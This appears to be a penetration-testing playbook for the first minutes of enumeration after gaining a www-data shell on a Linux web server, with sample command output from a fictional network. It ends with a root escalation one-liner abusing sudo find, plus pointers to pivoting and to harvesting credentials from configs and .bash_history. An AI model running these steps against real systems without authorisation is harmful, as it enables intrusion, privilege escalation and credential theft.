# Linux Post-Access Discovery

## Scenario
Shell as `www-data` after exploiting web application. First 5 minutes of enumeration.

## Phase 1: System Context (30 seconds)
```bash
$ whoami && id && hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
webserver01

$ uname -a
Linux webserver01 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 GNU/Linux

$ cat /etc/os-release | head -4
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
VERSION_ID="20.04"
```

## Phase 2: Network Position (1 minute)
```bash
$ ip a | grep inet
    inet 127.0.0.1/8 scope host lo
    inet 10.10.10.75/24 brd 10.10.10.255 scope global eth0
    inet 172.16.0.5/16 brd 172.16.255.255 scope global eth1

$ ip route
default via 10.10.10.1 dev eth0
10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.75
172.16.0.0/16 dev eth1 proto kernel scope link src 172.16.0.5

$ ss -tlnp | head -10
State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
LISTEN 0      511    0.0.0.0:80           0.0.0.0:*
LISTEN 0      511    0.0.0.0:443          0.0.0.0:*
LISTEN 0      128    127.0.0.1:3306       0.0.0.0:*
LISTEN 0      128    0.0.0.0:22           0.0.0.0:*
LISTEN 0      128    172.16.0.5:6379      0.0.0.0:*

$ cat /etc/resolv.conf
nameserver 10.10.10.1
search megacorp.local
```

## Phase 3: Users & Accounts (1 minute)
```bash
$ cat /etc/passwd | grep -v nologin | grep -v false
root:x:0:0:root:/root:/bin/bash
deploy:x:1001:1001:Deploy User:/home/deploy:/bin/bash
admin:x:1002:1002:Admin User:/home/admin:/bin/bash
dbbackup:x:1003:1003:DB Backup:/home/dbbackup:/bin/bash

$ sudo -l
(ALL) NOPASSWD: /usr/bin/find

$ w
 17:45:12 up 45 days,  3:22,  1 user,  load average: 0.15, 0.10, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
admin    pts/0    10.10.10.50      15:30    2:15m  0.10s  0.10s -bash
```

## Key Findings
| Finding | Significance |
|---------|-------------|
| Dual-homed (10.10.10.x + 172.16.0.x) | Pivot point to internal network |
| MySQL on localhost:3306 | DB access with local creds |
| Redis on 172.16.0.5:6379 | Internal service, may be unauthenticated |
| DNS domain: megacorp.local | AD domain — enumerate further |
| sudo find NOPASSWD | Instant root via find -exec |
| admin logged in from 10.10.10.50 | Active user, potential target |
| 3 interactive users | deploy, admin, dbbackup |

## Next Steps
→ **privilege_escalation skill**: `sudo find / -exec /bin/bash \; -quit` → root
→ **lateral_movement skill**: Pivot to 172.16.0.0/16 via eth1
→ **credential_access skill**: MySQL creds in web configs, .bash_history
